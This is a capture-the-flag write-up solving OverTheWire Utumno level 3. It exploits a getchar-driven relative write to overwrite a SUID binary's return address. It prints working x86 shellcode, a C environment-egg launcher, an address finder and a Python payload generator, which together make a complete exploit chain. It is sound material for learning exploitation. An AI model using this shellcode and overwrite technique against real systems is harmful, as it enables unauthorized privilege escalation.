# OverTheWire — Utumno Level 3 Solution (utumno3 → utumno4)

> Goal: Get utumno4 user's password from `utumno3`.
> Technique: `getchar`-based **arbitrary (relative) write primitive** → overwrite return address
> byte-by-byte; env-var shellcode on executable stack; bypass stdio buffering by **embedding
> the command inside the shellcode**.

---

## 1. Connection

```bash
ssh utumno3@utumno.labs.overthewire.org -p 2227
# password: **********   (from the previous level)
```

---

## 2. Recon

```bash
ls -la /utumno/utumno3
# -r-sr-x--- 1 utumno4 utumno3 12424 utumno3   <-- SUID utumno4, group utumno3 = READABLE
strings /utumno/utumno3 | grep -E 'getchar|protector|argc'
#   getchar
#   GNU C17 ... -fno-stack-protector ...     <-- NO canary
readelf -l /utumno/utumno3 | grep -A1 GNU_STACK
#   GNU_STACK ... RWE                          <-- stack EXECUTABLE
```

Execution test:
```bash
/utumno/utumno3        # Segmentation fault (crashes without input)
```
- Only external function: **`getchar`** → input from stdin (NO argc constraint, different from utumno2).
- **No canary + executable stack + ASLR off.**

---

## 3. Static Analysis — `main` (arbitrary write primitive)

```bash
objdump -d -M intel /utumno/utumno3 | sed -n '/<main>:/,/^$/p'
```

Pseudocode:
```c
int main(void) {                  // ebp-0x38 = buf[24], ebp-0x4 = i, ebp-0x8 = c
    int i = 0, c;
    while ((c = getchar()) != EOF && i <= 23) {
        buf[i] = c;
        buf[i] ^= (3 * i);                          // transform
        char v = getchar();                          // second character (value)
        *(char*)(ebp + (signed char)buf[i] - 0x20) = v;   // <<< ARBITRARY WRITE
        i++;
    }
    return 0;
}
```

Each iteration reads **2 bytes**:
1. `c` → offset selector. `idx = c ^ (3*i)` (signed byte, [-128,127]).
2. `v` → value to write.
- Write location: **`ebp + idx - 0x20`** → with `idx ∈ [-128,127]` covers `ebp-0xA0 .. ebp+0x5F`.
- **Return address is at `ebp+4`** → to write there: `idx - 0x20 = 4` ⇒ **`idx = 0x24`**.
- Since `idx = c ^ 3i`, for the desired idx: `c = idx ^ (3*i)`.

So we can overwrite the return address (ebp+4..ebp+7) byte by byte using `idx = 0x24..0x27`.

---

## 4. Strategy

- Put shellcode with a large **NOP sled** in env variable (`EGG`) (stack RWE, ASLR off).
- Use the `getchar` primitive to write the sled's midpoint address into the return address (`ebp+4`).
- End the loop via `i > 23` (not EOF) → 24 iterations; first 4 write the address, remaining 20
  write to harmless locations (`idx=0`, `ebp-0x20` padding).
- After the loop: `leave; ret` → sled → shellcode → **utumno4 shell/command**.

### stdin byte stream
`getchar` order: `c0 v0 c1 v1 ... c23 v23` (48 bytes) + 1 byte (final `cond` getchar, `i=24` → loop ends) = **49 control bytes**.

| i | idx | c = idx^3i | v |
|---|-----|-----------|---|
| 0 | 0x24 | 0x24 | ret[0] |
| 1 | 0x25 | 0x26 | ret[1] |
| 2 | 0x26 | 0x20 | ret[2] |
| 3 | 0x27 | 0x2e | ret[3] |
| 4..23 | 0x00 | 3i | 0x90 (filler) |

### Address finding (deterministic)
ASLR off. Run a printer under **exactly the same conditions** (same 15-char path, same `envp={EGG}`)
and print `environ[0]` → identical to the target's EGG address.
`RET = environ[0] + 4 (skip "EGG=") + 30000 (60KB sled midpoint)`.

---

## 5. CRITICAL Bug — stdio buffering (`getchar`)

Initial approach: shellcode opens `/bin/sh`, reads remaining stdin as commands. **Didn't work.**

> `strace` proved the exploit **was working**: `execve("/bin/sh", ...) = 0` was visible.
> But the spawned shell did nothing. Reason: **glibc's `getchar` (FILE*) slurps up to 4096 bytes
> of stdin on the first call.** The loop uses 49 bytes; the remaining command bytes stay in the
> glibc buffer — `execve` **destroys** that memory. The new shell sees EOF on stdin → exits.

**Attempted workaround (fragile):** Make stdin a FIFO and send the command with a delay →
if the target's startup is slow (60KB env copy), stdin is still slurped. Timing unreliable.

**Final solution (deterministic):** **Embed the command inside the shellcode.** Env vars
allow any byte (not a filename, no badchars) → a null-free shellcode builds `/bin/sh -c "cat ..."`
on the stack and executes it. No stdin needed.

---

## 6. Final Exploit

### Self-contained shellcode (null-free, ~100 bytes)
```
setreuid(geteuid(), geteuid());
execve("/bin/sh",
       ["/bin/sh", "-c", "cat /etc/utumno_pass/utumno4", NULL],
       NULL);
```
All strings (`"/bin//sh"`, `"-c"`, command) built on the stack via `push` (no nulls in env var).
```c
unsigned char sc[]={
 0x31,0xc0,0xb0,0xc9,0xcd,0x80,0x89,0xc3,0x89,0xc1,0x31,0xc0,0xb0,0xcb,0xcd,0x80, /* setreuid */
 0x31,0xc0,0x50,                                                                  /* push NUL */
 0x68,0x6d,0x6e,0x6f,0x34, 0x68,0x2f,0x75,0x74,0x75, 0x68,0x70,0x61,0x73,0x73,    /* "cat /etc/utumno_pass/utumno4" */
 0x68,0x6d,0x6e,0x6f,0x5f, 0x68,0x2f,0x75,0x74,0x75, 0x68,0x2f,0x65,0x74,0x63,
 0x68,0x63,0x61,0x74,0x20, 0x89,0xe6,                                             /* esi=cmd */
 0x31,0xc0,0x50, 0x66,0xc7,0x04,0x24,0x2d,0x63, 0x89,0xe7,                         /* "-c"; edi=-c */
 0x31,0xc0,0x50, 0x68,0x2f,0x2f,0x73,0x68, 0x68,0x2f,0x62,0x69,0x6e, 0x89,0xe5,    /* "/bin//sh"; ebp=binsh */
 0x31,0xc0,0x50,0x56,0x57,0x55, 0x89,0xe1,0x89,0xeb,0x31,0xd2,                     /* argv=[binsh,-c,cmd,0]; ecx=argv; ebx=binsh */
 0x31,0xc0,0xb0,0x0b,0xcd,0x80};                                                  /* execve */
```

### `ex3.c` — EGG builder + launcher
```c
#include <unistd.h>
#include <string.h>
#include <stdio.h>
unsigned char sc[]={ /* 100 bytes above */ };
#define SLED 60000
static char eggenv[4+SLED+256];
static char *envp[2];
int main(int argc,char**argv){
 memcpy(eggenv,"EGG=",4); memset(eggenv+4,0x90,SLED);
 memcpy(eggenv+4+SLED,sc,sizeof sc); eggenv[4+SLED+sizeof sc]=0;
 envp[0]=eggenv; envp[1]=0;
 if(argc>=2 && !strcmp(argv[1],"find")){ char *av[]={"/tmp/p2A7xK9mLq",0}; execve("/tmp/p2A7xK9mLq",av,envp); }
 else { char *av[]={"/utumno/utumno3",0}; execve("/utumno/utumno3",av,envp); }
 perror("execve"); return 1;
}
```

### `pr.c`
```c
#include <stdio.h>
extern char **environ;
int main(){ printf("ENVADDR=%p\n",(void*)environ[0]); return 0; }
```

### Execution
```bash
gcc -m32 -o ex3 ex3.c
gcc -m32 -o /tmp/p2A7xK9mLq pr.c        # 15-char path (len == /utumno/utumno3)

ENV0=$(./ex3 find | sed -n 's/.*ENVADDR=0x\([0-9a-f]*\).*/\1/p')
RET=$(python3 -c "print('%x'%(int('$ENV0',16)+4+30000))")     # sled midpoint

# 49 control bytes: write ret address into ebp+4..7, end loop
python3 - "$RET" > ctrl.bin <<'PY'
import sys
ret=int(sys.argv[1],16); b=ret.to_bytes(4,'little'); s=bytearray()
for i in range(24):
    if i<4: idx=0x24+i; v=b[i]
    else:   idx=0x00;   v=0x90
    s+=bytes([(idx^(3*i))&0xff, v])
s+=b'\n'
sys.stdout.buffer.write(s)
PY

./ex3 run < ctrl.bin            # ret -> sled -> shellcode -> "cat" prints password
```

Output:
```
ENV0=fffef51f RET=ffff6a53
**********
```

---

## Summary / Lessons Learned

| Topic | Note |
|-------|------|
| **Arbitrary relative write** | `*(ebp+idx-0x20)=v` → `idx=0x24` overwrites return address (`ebp+4`) |
| **Byte-by-byte ret overwrite** | XOR transform (`c^3i`) is known so correct `c` is chosen per byte |
| **Loop ends without EOF** | Ends at `i>23` (24 iterations) → stdin remains open if needed |
| **stdio read-ahead** | `getchar` slurps entire pipe; `execve` destroys the buffer → leftover stdin lost |
| **FIFO timing is fragile** | Slow target startup creates race condition |
| **Embed command in shellcode** | Most robust: env var allows any byte → build `/bin/sh -c "cat ..."` on stack |
| **strace = diagnosis** | `execve("/bin/sh")` was visible → logic correct, problem was in I/O layer |
